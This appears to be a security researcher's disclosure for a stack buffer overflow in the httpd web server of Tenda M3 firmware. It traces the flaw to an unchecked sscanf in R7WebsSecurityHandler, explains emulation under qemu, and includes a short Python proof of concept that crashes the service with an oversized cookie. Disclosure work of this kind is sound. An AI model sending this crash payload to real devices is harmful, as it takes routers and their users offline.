# Tenda M3 contains Stack Buffer Overflow Vulnerability

## overview

- type: stack overflow vulnerability

- supplier: Tenda https://www.tenda.com 

- product: TendaM3 https://www.tenda.com.cn/product/M3.html

- firmware download:   https://www.tenda.com.cn/download/detail-3133.html

- affect version: TendaM3 v1.0.0.12(4856)

## Description

### 1. Vulnerability Details

the `httpd` in directory `/bin` has a stack buffer overflow. The vunlerability is in fucntion `R7WebsSecurityHandler` 

![image-20220819012934119](readme.assets/image-20220819012934119.png)

It use sscanf to read strings to stack buffer `dest`without checking its length. 

### 2. Recurring loopholes and POC

use qemu-arm-static to run the `httpd`, we need to patch it before run. 

- in `main` function, The `ConnectCfm` function didn’t work properly, so I patched it to `NOP` 

poc of DOS(deny of service)

```python
import requests


cookies = {
    "Cookie": "user=.gif"+"a"*0x200
}

res = requests.post("http://127.0.0.1/goform/helloworld", cookies=cookies)
print(res.content)


```

![image-20220819012908220](readme.assets/image-20220819012908220.png)

![image-20220819012810224](readme.assets/image-20220819012810224.png)

